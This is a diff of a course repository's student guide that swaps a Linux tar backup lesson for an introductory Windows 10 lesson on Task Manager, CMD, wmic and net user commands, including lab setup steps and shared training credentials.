@@ -1,1153 +1,1000 @@
-## 5.1 Student Guide: Backups and Restoring Data with `tar`
+## 7.1 Student Guide: Introduction to Windows and `CMD`
 
-### Overview
+### Class Overview
 
-Today's class focuses on how to use backup and recovery to protect data integrity and availability.  You will use the tar command is used to create, list, and extract data from archives. Creating archives ensures the availability of users’ data and configuration files.
-
-Archiving and Logging Data are essential tasks for a Linux System Administrator for many reasons. 
-
-In this unit, we show how:
-
-- Archiving ensures that data can survive natural disasters and cyberattacks.
-- Tasks can be created to automate hourly, daily, weekly, or monthly backups.
-- Log files can be monitored for suspicious activity, and ensure that the system is running optimally.
-
+Today's class begins our unit on Windows administration and hardening. You will be introduced to to the Windows operating system and command line by performing basic system administration tasks in Windows 10.
 
 ### Class Objectives
 
-By the end of today's class, you will be able to:
+By the end of class, you will be able to:
 
-* Identify and describe use cases for the three kinds of backups.
+- Leverage the Windows command prompt (`CMD`) to execute various sysadmin responsibilities. 
+- Use `wmic`, Task Manager, and `services.msc` to manage applications and services.  
+- Create, manage, and view user information using the command-line tool `net`.
+- Manage password policies using `gpedit`.
 
-* Create (tar) an archive from existing files and directories.
+- Schedule tasks using Task Scheduler.
 
-* List and search the contents of an existing archive.
+### Lab Environment
 
-* Extract (untar) the contents of an archive.
+Note that your RDP host contains two nested virtual machines. Specifically, these nested VMs are:
 
-* Describe and demonstrate two exploits for the `tar` command.
+- A **Windows Server** instance, which you will use later this week
+- A **Windows 10** instance, which you will use in class today.
+
+All demonstrations and activities will be done within the **Windows 10 VM**.
+
+- Credentials for the Windows RDP machine:
+  - Username: `azadmin`
+  - Password: `p4ssw0rd*`
+
+- Credentials for the Windows 10 VM for Day 1 Activities:
+  - Username: `sysadmin`
+  - Password: `cybersecurity`
+
+Because we are using a virtualized environment for the Windows 10 machine, the screen resolution may not fill the entire screen during demos. 
+
+To adjust screen resolution:
+
+- Log into the Windows 10 VM and right-click anywhere on the screen.
+- In the new tab that opened scroll down to **Display Settings**. 
+- A new **Display** window will pop up. Navigate to **Display resolution** and adjust the resolution to match your screen from here.
+
+#### Saved State Clearing
+
+Hyper-V VMs should be shut down after every session to avoid the HyperV Machine going into a hibernation known as a 'Saved State'. If a machine goes into a saved state, you may see the error `The application encountered an error while attempting to change the state of the 'VM-Name'.` 
+
+- If you see this error, the VM may not startup until you _delete the saved state_. Turning the VM's and the host machine off when not in-use will avoid this troubleshooting overhead.
+
+To delete the saved state, run the following PowerShell line to clear the Hyper-V virtual machine _saved states_:
+
+- `Get-VMSnapshot | Remove-VMSavedState`.
+
+**Note:** If you are unsure how to launch PowerShell, click on to the bottom left `Start` menu button and type "PowerShell".
+
+**Note:** that if, at any point, you come across an error that says `The application encountered an error while attempted to change the state of...` when starting up your virtual machines, you rill need to run `Get-VMSnapshot | Remove-VMSavedState` again.
+
+After deleting the saved state, you can turn on the **Windows 10** and **Windows Server** virtual machines by running:
+
+  - `Get-VM | Start-VM`
+  
+  
+#### Differentiating between lab host machine and Windows 10 VM
+
+Due to the lab machine and the Windows 10 virtual machine having the same background, it can make it confusing for you to know which machine they are working on. It is highly advised that you change the background for the lab machine (the one you RDP connect to) by doing the following:
+
+- Right-click the Azure lab machine's desktop and select `Personalize`.
+
+- On the `Personalize` page, you should change the background to something of your liking or a solid background color so that you know **NOT** to make any IP configuration changes to this machine
+
+### Additional Resources
+
+- [SS64 Windows Environment Variables](https://ss64.com/nt/syntax-variables.html)
+
+- [SS64 Command-line info about WMIC](https://ss64.com/nt/wmic.html)
+
+- [Microsoft Documentation on WMIC](https://docs.microsoft.com/en-us/windows/win32/wmisdk/wmic)
+
+- [Net User Commands](https://www.digitalcitizen.life/how-generate-list-all-user-accounts-found-windows)
+
+- [Adding Users from CMD](https://www.wikihow.com/Add-Users-from-CMD)
+
+### Lesson Slideshow and Time Tracker
+
+- The slides for today can be viewed on Google Drive here: [7.1 Slides](https://docs.google.com/presentation/d/1ffFQ_s-tOFg0UtkERBqYgfuZEy581EXvVGi4NXPdqUU/edit#slide=id.g4f80a3047b_0_990)
 
 
-### Class Slides
+- **Note**: Editing access is not available for this document. If you  wish to modify the slides, please create a copy by navigating to File > "Make a copy...".
+
+### Important Note on Shutting Down VM
+
+HyperV VMs should be shut down after every session to avoid the Hyper-V Machine going into a hibernation known as a 'Saved State'. 
+
+- If a machine goes into a saved state, you may see the error `The application encountered an error while attempting to change the state of the 'VM-Name'.` 
+
+- If you see this error, the VM may not startup until you delete the saved state. 
+
+- Turning the VMs and the host machine off when not in-use will avoid this troubleshooting overhead.
+
+To delete the saved state, using the Hyper-V manager, go to the `Action` dropdown and choose `Delete saved state`.
+
+---
+### 01. Introduction to Windows
+
+Today's lesson will introduce the fundamental concepts and details related to the Windows operating systems.
+
+- Despite many IT professionals preferring Mac OS and Linux for their operating systems, Windows is still the market leader for desktop operating systems.
+
+The ubiquitous usage of Windows as personal computers and workstations makes them the most common target for today's attackers. 
+
+- Much of the malware that exists today specifically targets vulnerabilities in unpatched and unsecured Windows personal computers and servers.
+
+- Therefore, as a security professional, you will likely interact with Windows—whether it's the operating system you use daily, or as part of your company or client's infrastructure.
+
+Understanding Windows is essential for the following IT and cybersecurity specializations:
+
+- **SOC Analyst**: As an SOC, or security operations center analyst, your familiarity with Windows will be tested nearly every day. As part of your daily routine, you may observe anywhere from one or two, to several thousand security-related incidents and alerts dealing with Windows endpoints.
+
+- **Systems Administration**: The large majority of system administrators work with one or more Microsoft products and/or services: Windows PCs, Windows Servers, Office 365, and Exchange to name a few.
+
+- **Penetration Testing**: Due to Windows workstations and servers being widely used in organizations and businesses, it is vital that penetration testers know how to exploit Windows and Microsoft-related products.
+
+- **Endpoint Forensics**: Because the most commonly supported endpoint device in an organization is likely to be Windows, it is critical that forensics investigators understand how Windows works, at a granular level.
+
+Today's activities and demonstrations will cover common system administration tasks utilizing command line and GUI tools to troubleshoot a problematic Windows PC. During this process, we will create a report with our findings.
+
+You will complete the following tasks throughout the day:
+
+- Audit processes with Task Manager.
+
+- Use the command line to gather information and create files.
+
+- Enforce password policies.
+
+- Manage users.
+
+- Automate tasks.
+
+You will be learning the "Windows way" of performing basic system administration tasks they've already learned to do on Linux. 
+
+### 02. Launching Your Windows Lab (0:10)
+
+We'll begin by setting up our Azure Lab Environment. Follow these instructions alongside your instructor. 
+
+#### Log into Azure Labs
+
+1. Use RDP to log into their Azure lab. 
+
+    - Credentials for the Azure RDP Host:
+    - Username: `azadmin`
+    - Password: `p4ssw0rd*`
+
+2. Launch the **Hyper-V Manager**:
+
+    - Click the bottom-left Windows icon (the Start Menu button) in the Azure RDP host.
+    - Type "Hyper-V" in the search to show the **Hyper-V Manager** application.
+    - Click on **Hyper-V Manager** to launch the Azure virtualization lab.
+
+This **Hyper-V Manager** is equivalent to the **VirtualBox Manager**. It manages and launches virtual machines within our Azure environment.
+
+#### Increase Hyper-V Virtual Machine Resource Allocations
+
+Before we start today's lessons, we need to ensure that we have proper resource allocation for our virtual machines. In order to do so, we're going to increase the available RAM and CPU for our Windows 10 virtual machine.
+
+1. In the **Hyper-V Manager**, on the left pane, click  the tabulated entry beneath "Hyper-V Manager". It will look like a combination of letters of numbers (e.g.: `ML-REFVM-370502`).
+
+    - The middle pane will change to show  a list of virtual machines available within our Azure lab.
+
+2. Ensure your virtual machine is shut off by right-clicking the **Windows 10** virtual machine and selecting `Turn Off...`
+
+3. Right-click the **Windows 10** virtual machine and go to **Settings**.
+
+  - Under `Memory`, change the `RAM` to:`8192` MB.
+
+  - Under `CPU`, change the `Number of virtual processors` to `2`
+
+  - Select `Apply`, then `OK` at the bottom to apply these changes.
+
+This will give our virtual machine additional resources from our RDP host machine to run on, improving its performance. Since we are using nested virtualization, it's important to allocate enough resources to maximize virtual machine performance.
+
+#### Launch the Windows 10 Virtual Machine
+
+All of your activities will be done within these virtual machines.
+
+-  Double-click the **Windows 10 virtual machine** to launch it. 
+
+    - Credentials for the Windows 10 VM for today's activities:
+    - Username: `sysadmin`
+    - Password: `cybersecurity`
+
+**Note**: If you encounters save state issues, run the PowerShell command: `Get-VMSnapshot | Remove-VMSavedState` **within the RDP lab** and attempt to re-launch the Windows 10 VM. See your instructional staff for additional information.
 
 
-The slides for today can be viewed on Google Drive here: [5.1 Slides](https://docs.google.com/presentation/d/1JKMI7G4udBd9PiD_pEwC36ulb8yWTIAtbAIFjkuQzFM/edit)
+#### Startup Application and Installer Maintenance
+
+The nested Windows 10 machine has a lot of clutter installed on it (which will be addressed later in the day). In order to get started with it this clutter, we will need to close these start-up application windows.
+
+- For any application or installer window that pops up after booting the machine, click the top-right `X` in each Window to close it. If it asks you if you are sure, confirm.
+
+We'll look at how to disable these applications in a few minutes.
+
+#### Extend the Windows Virtual Machine Evaluation License
+
+This Windows 10 virtual machine will require an extension of the evaluation license so that the Windows 10 does not shut down abruptly.
+
+Within the **Windows 10 Virtual Machine**:
+
+1. Select the Windows icon at the bottom-left and begin typing `CMD`.
+
+2. When the `Command Prompt` application shows up, right-click and select `Run as administrator`.
+
+3. Within the administrator CMD terminal window inside of the Windows 10 VM, run the following command:  
+    -  `slmgr.vbs /rearm`
+
+4. The virtual machine can then be rebooted by clicking the Windows icon, selecting the power icon above it, then selecting `Restart`.
+
+This will add an additional 90 days to our virtual machine evaluation license and prevent unwanted shut downs that occur from expired licenses.
+
+**Note**: Repeat the same steps within the **Windows Server Virtual Machine** if there is less than 30 days on the evaluation license.
+
+### 03. Everyone Do: Introduction to Task Manager (0:15)
+
+Have you noticed the various processes that started up when we logged into the Windows 10 VM?
+
+- This is what an un-managed Windows workstation may end up looking like if it's not maintained by an organization's system administrators.
+
+- Remember that during the Linux system administration lessons, we learned how to enumerate and inspect running processes using `top`.
+
+#### Introducing Task Manager
+
+Today's first demonstration focuses on cleaning up these unnecessary processes with a Windows process management tool: **Task Manager**.
+
+Understand the following about Task Manager:
+
+- Windows, like Linux, has the same concept of errant/runaway processes
+- Therefore, we need a way to inspect and troubleshoot process resource utilization in Windows
+- On Windows, we can use the Task Manager GUI to inspect and manage processes, instead of `top`'s CLI
+- Because of this, using Task Manager to manage processes is easier than using `top`
+- Task Manager also allows us to do manage other important system components, such as start-up processes.
+
+Processes in Windows are much like the processes and PIDs that we worked with in the Linux units.
+
+Some use cases for Task Manager include:
+
+- Some programs, when not in use but left running, may take up excessive resources or even allow for unwanted remote connections. Some examples are:
+
+  - Google Chrome, which is well-known for its high memory usage.
+
+  - Teamviewer, the remote desktop application, has had critical issues that left systems extremely vulnerable within public internet.
+
+- Some processes can even cause memory leaks that can result in system instability and abrupt system crashes. 
+
+ - When a Windows system crashes, you are often stuck with what what is known as the **blue screen of death**.
+
+Security professionals can also use Task Manager audit processes to identify incorrect or malicious processes:
+
+- For example, many cryptojacking processes, or cryptominers, use excessive CPU and/or network resources even while a system is idle.
+
+#### Task Manager Overview
+
+For this upcoming demo, we're going to use Task Manager to identify resource bottlenecks and start-up processes that are potential issues within our Windows 10 machine.
+
+First, we'll walk through how to audit processes based on resource utilization.
+
+On your Windows 10 VM, complete the following steps: 
+
+- Right-click on the Task Bar at the bottom of the Windows desktop and choose `Task Manager`. Expand this window as needed.
+
+- With **Task Manager** launched, make sure you're on the `Processes` tab. 
+
+All running processes on the computer can be seen in this `Processes` tab. 
+
+Each column header shows the resource utilization of each process: `CPU`, `Memory`, `Disk`, and `Network`. These can be sorted in ascending or descending order.
+
+- Click on the `Memory` resource column header.
+
+Click on to the `Performance` tab.
+
+- This tab shows resource utilization visualized in charts. This is useful information for system administrators when there are extended periods of high or abnormal amounts of resource usage.
+
+One of the key functionalities of Task Manager is ending errant processes: processes that are not behaving as they should. 
+
+For example, suppose that we notice spikes in CPU usage. We would need to identify the errant process creating these spikes, and end it.
+
+In our case, we have a process with exceptionally high CPU usage.
+
+#### Task Manager Demo: Terminating the CPU-thrashing Process
+
+This Windows 10 VM may seem to be running slowly and this is due to an unwanted process. Luckily, ending this process is trivial with `Task Manager`.
+
+- With `Task Manager` still open, on the `Processes` tab:
+
+  - Click on the `CPU` column header to sort the CPU by descending resource utilization (`Microsoft Windows Based Script Host` should be at the top).
+
+  - Click on the high CPU process, `Microsoft Windows Based Script Host`.
+
+This process has been utilizing a large amount of CPU resources and that it does not seem to end.
+
+In most cases, a idle workstation should not have a process taking up this much CPU for an in perpetuity, so we'll want to end it.
+
+  - With the `Microsoft Windows Based Script Host` process highlighted, click on `End task`.
+
+Ending problematic processes within Windows is easily manageable using the `Task Manager`.
+
+#### Removing Startup Processes
+
+Now that we've stopped these processes, we want to make sure they no longer start up when the Windows machine boots up. We can do that by disabling these processes in `Task Manager`'s `Startup` tab.
+
+- With `Task Manager` still open, go to the `Startup` tab:
+
+  - Each listing under the `Startup` tab is a process that boots up when the machine does.
+
+- Select the `crypto_miner` startup process 
+
+This is clearly not a process we want starting up anymore.
+
+- Click on `Disable` to prevent the CPU-hogging process we saw earlier, `Microsoft Windows Based Script Host` from starting up with the Windows machine.
+
+The next time this machine is booted, this intensive CPU task will no longer start up with the machine.
+
+While troubleshooting with Task Manager seems like a simple process, managing running and startup processes is an important skill to know across all platforms. It is also a vital first step to solving many security-related problems, such as incident response, digital forensics, and threat hunting.
+
+Managing startup applications is important for system and security administrators for multiple reasons:	
+
+- Startup applications can slow boot time due to their execution priority.	
+
+- These applications may use excessive resources while in the background, causing random system slowdowns.	
+
+- Applications might use the network in the background. They might, for example, initiate their own automatic updates, hogging network bandwidth.	
+
+- Startup applications may require special permissions for their functionality. These can pose security risks if, for example, they are compromised through malware. Malware could then potentially run with escalated privileges.
+
+### 04. Instructor Do: Introduction to Command Prompt, `CMD` (0:15) 
+
+Now that we have freed up some system resources by ending the resource-hogging process and disabling startup processes, we can now move onto learning about the Windows command line.
+
+First, let's look at the common directory structure in Windows
+
+#### Directory and File Structure
+
+- Windows irectories are indicated with a backslash (`\`), as opposed to Unix's forward slash (`/`).
+
+- Notice the following default Windows directory structure:
+
+  ```console
+  C:\
+  ├── PerfLogs\
+  ├── Program Files\
+  ├── Program Files (x86)\
+  ├── ProgramData\ [hidden folder]
+  ├── Users\
+  │     └── [username]\
+  │           └── Desktop\
+  │           └── Documents\
+  └── Windows\
+        └── System32\
+              └── Config\
+              └── Drivers\
+                      └── etc\
+                            └──hosts
+                            └──networks
+        └── Spool
+        └── Temp
+  ```
+
+- Know that the Windows directory structure does not follow the conventional naming scheme or structure of common Unix systems. For example, instead of directories named `/etc` and `/var`, there are directory names such as `Program Files` and `PerfLogs`.
+
+#### Common Directories 
+
+Now let's look at some common and important Windows directories, and compare them to Linux counterparts, where applicable. In these examples, our root drive is `C:\`:
+
+- `C:\` (or whichever root drive Windows is installed on) is the root drive.
+
+- `C:\Program Files\` is where 64-bit applications are installed.
+
+- `C:\Program Files (x86)\` is where 32-bit applications are installed.
+
+- `C:\ProgramData\`  is a hidden directory where application-specific settings reside.
+
+- `C:\Users\` is the directory for all users, including our `sysadmin` user. This is similar to Linux's `/home` directory.
+
+- `C:\Users\[username]\` is each specific user's home folder. Their settings and files are saved here and in subdirectories.
+
+  - `C:\Users\sysadmin\Documents\` is the `Documents` folder for our `sysadmin` user.
+  - `C:\Users\sysadmin\Desktop\` is the `Desktop` folder for the `sysadmin` user.
+
+- `C:\Windows\` is where Windows-specific programs and libraries are located.
+
+  - `C\Windows\System32\` is where main component Windows system applications configuration settings are located.
+
+Familiarity with these directories will develop over time, as we complete activities and learn more about Windows. 
+
+#### `CMD` and Environment (ENV) Variables
+
+The Windows command prompt `CMD`, or `cmd.exe`, is the command line interface for Windows, comparable to a Unix shell, such as **bash** for Linux.
+
+Today's lesson will heavily use `CMD`. We'll get started by introducing some basic commands. 
+
+Launch `CMD` by going to the bottom-left Windows icon and begin typing "CMD". Right-click the `Command Prompt` and select `Run as administrator`.
+
+**Environment variables** from the bash programming unit work the same way in Windows.
+
+Environment variables, also called envvars, are special values that contain information about the system, such as the user's home directory, or the system's program files directory.
+
+Envvars in Windows can be used for the following:
+
+- Replacing long directory paths with shorter ones.
+- Grabbing the current time
+- Finding the location of your system files.
+
+**Environment variables** are different than Linux's in that they are surrounded by percent signs (`%`) instead of starting with a `$` sign. For example: 
+
+- In Windows, an environment variable `VAR` would be: `%VAR%`
+
+- In Linux, an environment variable `VAR` would be: `$VAR`  
+
+Know that we can combine **environment variables** with regular directory names. 
+
+- Run `cd %USERPROFILE%\Desktop` to navigate to the desktop directory.
+
+Understand that `%USERPROFILE%` is a variable that is assigned to the value of the **current user's home directory**, or in this case: `C:\Users\sysadmin`. This is the same as `$HOME` in Linux.
+
+Like in Linux, many default environment variables exist for Windows.
+
+Note the following default Windows environment variables:
+
+| Environment Variable | Default Value          |
+| :------------------- | :--------------------- |
+| `%CD%`                 | Current directory      |
+| `%DATE%`               | Current date       |
+| `%OS%`                 | Windows                |
+|` %ProgramFiles%`     | C:\Program FIles       |
+| `%ProgramFiles(x86)%`  | C:\Program Files (x86) |
+| `%TIME`                | Current time       |
+| `%USERPROFILE%`        | C:\Users\{username}    |
+|` %SYSTEMDRIVE%`        | C:\                    |
+| `%SYSTEMROOT%`         | C:\Windows             |
+
+We won't need to know all of these as a list of common envvars will be provided as reference whenever needed.
+
+#### More `CMD`, Commands
+
+Some commands are similar to Linux, while some are completely different.
+
+Note the following navigation commands. We will practice them in the following demo.
+
+  - `cd` or `chdir` changes directories. This works like Linux's `cd`, however
+
+    - `cd` by itself will function like `pwd` or _print working directory_ in Linux.
+
+  - `dir` lists the contents of a directory. This works like Linux's `ls`.
+
+Let's try these navigation commands with an environment variable.
+
+- While still in `cd %USERPROFILE%\Desktop`, run the following:
+
+  - `cd` to see the current directory, then
+  - `cd ..` to move up to the parent directory, then
+  - `dir` to list the contents of the directory. This should list the contents of `C:\Users\sysadmin`
+
+Next, note the following command prompt operations:
+
+  - `md` or `mkdir` creates directories.
+
+  - `copy` copies a file. This works like Linux's `cp`.
+
+  - `move` cuts and pastes files. This works like Linux's `mv`.
+
+  - `del` or `erase` deletes files and directories. Directories will prompt a user to confirm.
+
+    - Note that files deleted with this command do not go to the `Recycle Bin`, as they do when we delete files with a GUI. Deleted files cannot be restored. 
+
+  - `rd` or `rmdir` removes a directory if it's empty. Non-empty directories must be removed with `rmdir /S` or `rd /S`.
+
+  - `find` functions like `grep` in that it searches a file for specific criteria. For example, `find "hello" greeting.txt` will search the `greeting.txt` file for the string `hello`.
+  
+  - `echo` prints output to the screen like in Linux.
+
+  - `type` followed by a filename shows the contents of a file. This is similar to `cat` in Linux.
+
+  - `cls` clears the screen of the cmd prompt.
+
+  - `exit` closes `CMD` like in most terminals.
+
+#### Use CMD to Create TODO List Demo
+
+Let's try a few of these commands by using `CMD` to create a todo list. We'll do this by _outputting_ and _appending_ printed console output to a text file. To start, run the following:
+
+  - `cd Desktop` to return to the `C:\Users\sysadmin\Desktop` directory
+
+  - `mkdir Audit` to create a `Audit` subdirectory
+
+  - `cd Audit` or `chdir Audit` to enter that directory
+
+We can use `echo` in conjunction with `>` in Windows to _output_ console text to a file. Run:
+
+  - `echo hello > todo.txt` to create a new file called `todo.txt`
+
+  - `dir` to display the directory's contents, to confirm that the file exists
+
+  - `type todo.txt` to show the contents of `todo.txt`, which is `hello`. Reiterate `type` works like `cat` in Linux.
+
+If we use `echo` with a `>` again, it will _overwrite_ the file's contents. Run:
+
+  - `echo Review Task > todo.txt` to overwrite the contents of `todo.txt`, then
+
+  - `type todo.txt` again to show that the contents of `todo.txt` now being `Review Task`
+
+We can use `>>` instead of `>` to _append_ contents to a file without overwriting anything. Run:
+
+  - `echo 1. Check for CPU-Intensive Processes >> todo.txt` to append a todo task to our `todo.txt` list. Then:
+
+  - `echo 2. Disable Unnecessary Startup Processes >> todo.txt` to append a second todo task to our todo list.
+
+  - `type delete_me.txt` to show the new contents of the `todo.txt` file:
+
+      ```
+      1. Check for CPU-Intensive Processes
+      2. Disable Unnecessary Startup Processes
+      ```
+
+We can use `del` to delete files. Run:
+
+  - `del todo.txt` to delete the `todo.txt` file. Confirm by running:
+
+  - `dir` to show `todo.txt` has been deleted. Lastly, run:
+
+  - `cls` to clear the terminal screen.
+
+Know that as you get more proficient with the command line, you will be more prepared to execute and automate tasks in future systems and security-related roles.
+
+### 05. Task Manager and `CMD` Activity 
+
+- [Activity File: Task Manager and CMD ](Activities/05_Intro_CMD/Unsolved/readme.md)
+
+### 06. Task Manager and CMD Review 
+
+- [Solution Guide: Task Manager and CMD](Activities/05_Intro_CMD/Solved/readme.md)
+
+### 07. Creating a Report with `wmic` Output 
+
+Now we will be further developing the Windows command line proficiency with the command-line tool `wmic`: **Windows Management Instrumentation Command**.
+
+- `wmic`, a very powerful tool for managing Windows computers, allows a user to query a large array of system information and diagnostics, such as information about the operating system and hard disks.
+
+- System administrators can also use `wmic` to launch, terminate, install, and uninstall processes.
+
+We will be using this command-line tool extensively to retrieve information about the system to add to our Windows report.
+
+#### Windows Management Instrumentation Command `wmic` Structure and Conventions
+
+`wmic` has the following query structure:
+
+`wmic [global switches] [alias] [verbs] [properties]`
+
+- `[global switches]` are global commands called on `wmic`. They can do things like specify a file to append output to. Today, we will use the command `/APPEND`.
+
+  - For example: `wmic /APPEND:report.txt os get caption` will append the Windows build number to `report.txt` file. This will add the output content to the file, and **not** overwrite the file. 
+- `[alias]` is the Windows component that you want `wmic` to query. Common aliases include:
+  - `os` (_operating system_), containing properties specific to the operating system, such as the Windows edition name and build number.
+  - `logicaldisk`, containing properties specific to the disk drives, such as drive name, file system, free space, size, and volume serial number.
+- `[verbs]` are actions we want to complete with the `wmic` command. 
+  - For example, if we are using `wmic os` to find operating system information, we will then use the `get` verb, followed by the various `[properties]` we want to find.
+- Common `[properties]` retrieved using `get` include:
+  - `caption` (i.e., `get caption`): returns a one-line description of the given `alias`.
+  - `/value` (i.e., `get /value`): returns _all_ of the properties and values of an alias and lists each on separate line. 
+
+#### Windows Management Instrumentation Command `wmic` Demo
+
+Now that we've covered the parts of a `wmic` query, let's retrieve information about the current operating system, which we will later add to our report.
+
+First we're going to use the `get /value` verb on the `os` alias:
+
+- Run `wmic os get /value` to return:
+
+  ```console
+  BootDevice=\Device\HarddiskVolume6
+  BuildNumber=18362
+  BuildType=Multiprocessor Free
+  Caption=Microsoft Windows 10 Enterprise Evaluation
+  ... [results truncated]
+  ```
+
+Now, we want to retrieve brief information about the operating system (or `caption`) and its build number. We will call those properties with `get`:
+
+- Run `wmic os get caption, buildnumber` to return:
+
+  ```console
+  BuildNumber  Caption
+  18362        Microsoft Windows 10 Enterprise Evaluation
+  ```
+
+- The output shows that we retrieved the `caption` and `buildnumber` properties of the operating system alias using the verb `get`.
+
+Once we've verified the results are what we want, we can append them to a file:
+
+- Run `wmic /APPEND:report.txt os get caption, buildnumber`
+
+Verify the output using the `type` command:
+
+- Run `type report.txt` to return:
+
+  ```console
+  BuildNumber  Caption
+  18362        Microsoft Windows 10 Enterprise Evaluation
+  ```
+
+- If the file's contents do not match what we want, we can simply use `del` to delete the file and start again.
+
+Now we're going to look for the following properties for each disk drive on the system with the the `logicaldisk` alias:
+
+- Each disk drive's name (or `caption`)
+- The installed file system
+- The amount of free space capacity
+- The total drive capacity
+- The volume serial number
+
+Run `wmic logicaldisk get caption, filesystem, freespace, size, volumeserialnumber`
+
+- The output is:
+
+  ```console
+  Caption  FileSystem  FreeSpace      Size           VolumeSerialNumber
+  C:       NTFS        36213682176    499460861952   920D80EE
+  ```
+
+After we verify that the output looks good, we can add the `/APPEND` global switch:
+
+- Run `wmic /APPEND:report.txt logicaldisk get caption, filesystem, freespace, size, volumeserialnumber`
+
+- Run `type report.txt`
+
+Now we have both of the previous outputs in our report:
+
+```console
+  Baselining Report
+  Created by [your name here]
+  Windows_NT system report created on Tue 11/19/2019 with logged in user, sysadmin
+  BuildNumber  Caption
+  18362        Microsoft Windows 10 Enterprise Evaluation
+
+  Caption  FileSystem  FreeSpace    Size          VolumeSerialNumber
+  A:
+  C:       NTFS        61574447104  135838822400  D6DAFA63
+  D:       NTFS        63250305024  68718358528   32195165
+```
+
+Knowing how to query system information via the command line a vital first step to learning Windows system administration. 
+
+While these are simple queries, `wmic` has many more powerful features that can manage and retrieve information on local and remote Windows personal computers and servers.
+
+- Run `type report.txt` to see the updated report.
+
+### 08. Creating a Report with `wmic` Output Activity
+
+- [Activity File: Creating s Report with `wmic` Output](Activities/08_WMIC_OS/Unsolved/readme.md)
+
+
+### 09. Creating a Report with `wmic` Output Review
+
+- [Solution Guide: Creating a Report with `wmic` Output](Activities/08_WMIC_OS/Solved/readme.md)
+
+### 10. Instructor Do: Users, and Password Policies 
+
+Now, we will use the command line to find user password policy and logon information.
+
+#### Introducing `net`
+
+Now, we will be using the command-line utility known as `net`.
+
+- `net` allows an administrator to query and set various settings relating to user accounts, groups, and password policies. 
+
+  - For example, a system administrator might pull information about an employee who has left the company, in order to see when they last logged in. They can then use `net` to delete their account.
+
+We will be using the following `net` utilities:
+
+- `net user`: For adding, removing, and managing users. In the following activity, we will use it to enumerate a list of all the users on the system, and then to enumerate information about the previous Windows developer, `sysadmin`.
+
+- `net localgroup`: For adding, removing, and managing local groups.
+
+    - While we are working with local groups now, we will be looking at domain groups in the future. Domain groups are groups created in Windows Server to manage entire sets of users with identical user permissions and policies.
+
+- `net accounts`: Allows you to see password and logon requirements for users to enforce password security policy.
+
+  - `net accounts` can be used to set the following password policies:
+
+    - The time before a password expires.
+
+    - The minimum number of characters required for password.
+
+    - The amount of time before passwords expire.
+
+    - The minimum number of days before a password can be changed.
+
+    - Number of times a password must be unique before it can be reused again. In other words, if this is set to two, a user needs to change their password to two new ones before an old one can be used again.
+
+For now, we will only be _retrieving_ these settings, but will _manage_ these in the following sections.
+
+Managing these passwords is similar to editing `/etc/pam.d/common-password` settings in Ubuntu Linux.
+
+#### `net` Demonstration Setup
+
+Next, we'll demonstrate `net` using the following scenario: 
+
+- Your CIO was curious about the groups and password policies on the Windows workstation. You are to retrieve more information from this Windows workstation using the `net user` command-line utility.
+
+We will be using the `net` tool to find information about user groups and password policies by doing the following tasks:
+
+  - Enumerate users to see `net` output.
+
+  - Enumerate `sysadmin`'s groups and password policies.
+
+  - Enumerate local groups with `net localgroup`.
+
+  - Enumerate the Windows workstation's current password policies with `net accounts`.
+
+#### Enumerate Users with `net`
+
+First, we will use the `net user` account to enumerate all the users on the system.
+
+- Run `net user`:
+
+  ```console
+  -------------------------------------------------------------------------------
+  Administrator                        Alex                     DefaultAccount                     
+  Guest                             sysadmin                 WDAGUtilityAccount
+  The command completed successfully.
+  ```
+
+#### Find **`sysadmin`**'s Password Status
+
+Next, we will look at specific password settings for our user `sysadmin`.
+
+- Run `net user sysadmin` and notice the following in the output:
+
+  - `Password last set`: When the password was last set for user, `sysadmin`. It was last set on `‎2/‎19/‎2020 11:04:20 PM`. **Note**: Your output will be different
+
+  - `Password expires`: The date that the current password for user, `sysadmin`, will _NOT_ expire. 
+
+  - `Password changeable`: The earliest date that the user `sysadmin` can change their password again. In this case, `‎2/‎19/‎2020 11:04:20 PM`. **Note**: Your output will be different
+
+  - `Password required`: The password policy that specifies whether or not the user _needs_ a password. For this user, they do _NOT_ need have a password. **Note** that this is obviously not a strong cybersecurity policy. All users should have passwords.
+
+  ```console
+  User name                    sysadmin
+  Full Name
+  Comment
+  User's comment
+  Country/region code          000 (System Default)
+  Account active               Yes
+  Account expires              Never
+
+  Password last set            ‎2/‎19/‎2020 11:04:20 PM
+  Password expires             Never
+  Password changeable          ‎2/‎19/‎2020 11:04:20 PM
+  Password required            No
+  User may change password     Yes
+
+  Workstations allowed         All
+  Logon script
+  User profile
+  Home directory
+  Last logon                   ‎7/‎16/‎2020 1:14:25 PM
+
+  Logon hours allowed          All
+  Local Group Memberships      *Administrators       *Users
+  Global Group memberships     *None
+  The command completed successfully.
+  ```
+
+  - **Note** Your output will look slightly different based on when your class started. 
+
+We will be changing these password policies later.
+
+#### Find Groups on the Machine
+
+Now we will enumerate a list of groups on the Windows workstation. It's important to know how to enumerate groups on a system as groups are created, removed, and updated as often as users are. 
+
+Groups of users can include: administrators, non-privileged users, users sorted by departments, users from third-party contractors, etc.
+
+- Run `net localgroup` and note the output (note your `DESKTOP` hostname will be different):
+
+  ```console
+  Aliases for \\DESKTOP-OCCSCFV
+
+  -------------------------------------------------------------------------------
+  *Access Control Assistance Operators
+  *Administrators
+  *Backup Operators
+  *Cryptographic Operators
+  *Device Owners
+  *Distributed COM Users
+  *Event Log Readers
+  *Guests
+  *Hyper-V Administrators
+  *IIS_IUSRS
+  *Network Configuration Operators
+  *Performance Log Users
+  *Performance Monitor Users
+  *Power Users
+  *Remote Desktop Users
+  *Remote Management Users
+  *Replicator
+  *System Managed Accounts Group
+  *Users
+  The command completed successfully.
+
+  ```
+  - **Note:** Results may vary. 
+
+#### Current Password Policy
+
+Next, we'll pull the password policies that are currently set for the Windows workstation:
+
+- Run `net accounts` and note the output:
+
+  ```console
+  Force user logoff how long after time expires?:       Never
+  Minimum password age (days):                          0
+  Maximum password age (days):                          90
+  Minimum password length:                              0
+  Length of password history maintained:                None
+  Lockout threshold:                                    Never
+  Lockout duration (minutes):                           30
+  Lockout observation window (minutes):                 30
+  Computer role:                                        WORKSTATION
+  The command completed successfully.
+  ```
+  - **Note:** Results may vary. 
+
+Enumerating information about users, groups, and password policies is important. For one, this information helps our organization understand the the current security policy posture on Windows workstations. 
+
+It's important for system administrators to be able to reliably pull this type of information from workstations on the fly, in order to ensure that they adhere to company policies.
+
+### 11. Users, Groups and Password Policies
+
+- [Activity File: Users, Groups, and Password Policies](Activities/11_Users/Unsolved/readme.md)
+
+### 12. Users, Groups and Password Policies 
+
+
+- [Solution Guide: Users, Groups, and Password Policies](Activities/11_Users/Solved/readme.md)
+
+
